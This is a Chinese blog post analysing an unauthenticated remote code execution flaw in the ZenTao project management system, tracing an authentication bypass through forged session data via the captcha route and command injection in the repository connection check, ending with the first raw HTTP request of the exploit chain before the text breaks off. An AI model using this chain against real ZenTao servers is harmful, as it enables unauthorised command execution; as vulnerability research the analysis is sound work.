---
title: 禅道项目管理系统未授权RCE分析记录 - magic_zero
url: https://www.cnblogs.com/magic-zero/p/17055893.html
source: 博客园 - magic_zero
date: 2023-01-17
fetch_date: 2025-10-04T04:03:08.891555
---

# 禅道项目管理系统未授权RCE分析记录 - magic_zero

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/magic-zero/)

# [Magic\_Zero](https://www.cnblogs.com/magic-zero)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/magic-zero/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/magic_zero)
* 订阅
* [管理](https://i.cnblogs.com/)

# [禅道项目管理系统未授权RCE分析记录](https://www.cnblogs.com/magic-zero/p/17055893.html "发布于 2023-01-16 17:07")

# 漏洞原理简介

禅道项目管理系统的鉴权模块存在逻辑设计缺陷，可以允许攻击者利用无须授权的模块去内存中“伪造”一个合法用户，然后利用该用户访问需要授权的模块。从而调用危险的路由，导致命令执行。

# 环境搭建

点击[下载](https://www.zentao.net/search-index-18.0-1-article.html)，然后直接根据版本搜索需要的即可。官方提供了一键安装包，为了节省时间，我直接使用了Windows下的[一键安装](https://www.zentao.net/dynamic/zentaopms18.0.beta1-81862.html)。

# 原理分析

从 www/index.php 中可以分析得知，禅道在对请求参数进行初始化结束后，对即将访问的路由模块进行了检查，接着调用Common模块的checkPriv方法对请求权限进行判断。然后调用对应模块的方法执行，输出结果。代码片段如下：

```
$app->parseRequest(); // 请求参数初始化
if(!$app->setParams()) return; // 对控制器模块进行安全检查，判断方法，类文件是否存在等
$common->checkPriv(); // 权限检查
$common->checkIframe();
$app->loadModule(); // 路由调用
```

## 权限检测模块的分析

参数处理，和其他相关检查不是本次分析的重点。因此暂时略过。checkPriv核心的逻辑如下：

```
public function checkPriv()
    {
        try
        {
            $module = $this->app->getModuleName();
            $method = $this->app->getMethodName();
            if($this->app->isFlow)
            {
                $module = $this->app->rawModule;
                $method = $this->app->rawMethod;
            }

            $beforeValidMethods = array(
                'user'    => array('deny', 'logout'),
                'my'      => array('changepassword'),
                'message' => array('ajaxgetmessage'),
            );
            if(!empty($this->app->user->modifyPassword) and (!isset($beforeValidMethods[$module]) or !in_array($method, $beforeValidMethods[$module]))) return print(js::locate(helper::createLink('my', 'changepassword')));
            if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth();
            if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie();
            if($this->isOpenMethod($module, $method)) return true;

            if(isset($this->app->user))
            {
                $this->app->user = $this->session->user;
                if(!commonModel::hasPriv($module, $method))
                {
                    if($module == 'story' and !empty($this->app->params['storyType']) and strpos(",story,requirement,", ",{$this->app->params['storyType']},") !== false) $module = $this->app->params['storyType'];
                    $this->deny($module, $method);
                }
            }
            else
            {
                $uri = $this->app->getURI(true);
                if($module == 'message' and $method == 'ajaxgetmessage')
                {
                    $uri = helper::createLink('my');
                }
                elseif(helper::isAjaxRequest())
                {
                    die(json_encode(array('result' => false, 'message' => $this->lang->error->loginTimeout))); // Fix bug #14478.
                }

                $referer = helper::safe64Encode($uri);
                die(js::locate(helper::createLink('user', 'login', "referer=$referer")));
            }
        }
        catch(EndResponseException $endResponseException)
        {
            echo $endResponseException->getContent();
        }
    }
```

代码较长，但是简而言之，这里的重点就是try语句块中的if-else判断块。从else中代码逻辑可以得出如果没有权限，返回信息输出后，将使用die函数退出。但是if语句块中没有权限将会走入deny函数中去，经过一些列判断后，最终执行helper::end()，抛出异常：

framework/helper.class.php：

```
public static function end($content = '')
{
    throw EndResponseException::create($content);
}
```

接着我们将目光回到checkPriv函数。看最终的catch语句捕获的就是EndResponseException异常。**也就是说，如果我们有机会控制逻辑判断的代码走到if语句块，那么就算没有权限。整个checkPriv函数也将会自己抛异常，自己处理。完全不影响后续执行控制器中的方法!**

## 控制SESSION 绕过逻辑判断

我们回到checkPriv函数中，可以看到如果要满足条件进入if语句块，我们需要保证$this->app->user不为空。因此全局搜索`$this->app->user =` ， 结果如下所示:

![](https://img2023.cnblogs.com/blog/892186/202301/892186-20230116163936338-1884385142.png)

分析得知，控制该值可以通过$this->session->user。但是这个值我们有机会控制么？

直接搜索`$this->session->user =` 是没结果的。搜索`$this->session->set(`可以得到如下的结果：
![](https://img2023.cnblogs.com/blog/892186/202301/892186-20230116164318451-253741057.png)

排除key无法控制的，得到了misc模块的captcha方法：

```
public function captcha($sessionVar = 'captcha', $uuid = '')
    {
        $obLevel = ob_get_level();
        for($i = 0; $i < $obLevel; $i++) ob_end_clean();

        header('Content-Type: image/jpeg');
        $captcha = $this->app->loadClass('captcha');
        $this->session->set($sessionVar, $captcha->getPhrase());
        $captcha->build()->output();
    }
```

$sessionVar的值我们可控。该功能为输出验证码的功能。因此默认一定是不需要权限的。

接着我们会有两个疑惑：

1. 此处设置过的session，下次请求还在么？
2. 该session什么时候赋值给$this->app->user

首先回答第一个问题，这里的session禅道的实现是在super这个全局超级对象类中实现的，实现的原理利用了PHP的SESSION机制。只要两次请求的PHPSESSID一致，那么获取到的session就是一致的。

第二个问题，我经过反复调试，发现commonModel在实例化的时候将会调用setUser方法，在这个方法中将session中保存的值放到全局的app对象中，代码片段如下：

```
    public function setUser()
    {
        if($this->session->user)
        {
            if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView();
            $this->app->user = $this->session->user;
        }
// ...
```

## 攻击点的寻找

repo模块的edit方法将会调用update方法，接着调用checkConnection方法对仓库是否可连接进行检查，checkConnection中危险操作如下：

```
public function checkConnection()
    {
        if(empty($_POST)) return false;

        $scm      = $this->post->SCM;
        $client   = $this->post->client;
        $account  = $this->post->account;
        $password = $this->post->password;
        $encoding = strtoupper($this->post->encoding);
        $path     = $this->post->path;
        if($encoding != 'UTF8' and $encoding != 'UTF-8') $path = helper::convertEncoding($path, 'utf-8', $encoding);

        if($scm == 'Subversion')
        {
            /* Get svn version. */
            $versionCommand = "$client --version --quiet 2>&1";
            exec($versionCommand, $versionOutput, $versionResult);
```

$client参数可以直接拼接进入到exec函数执行。在此，对代码分析后，并未发现需要网络上讲的需要先执行create，因为代码逻辑中并未对仓库是否存在做检查。不知道是我的版本问题，还是其他原因。暂且未深究。

## Chain it all together

1. 获取内存合法的用户

```
GET /zentao/misc-captcha-user.html HTTP/1.1
Host: 192.168.8.143
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-E...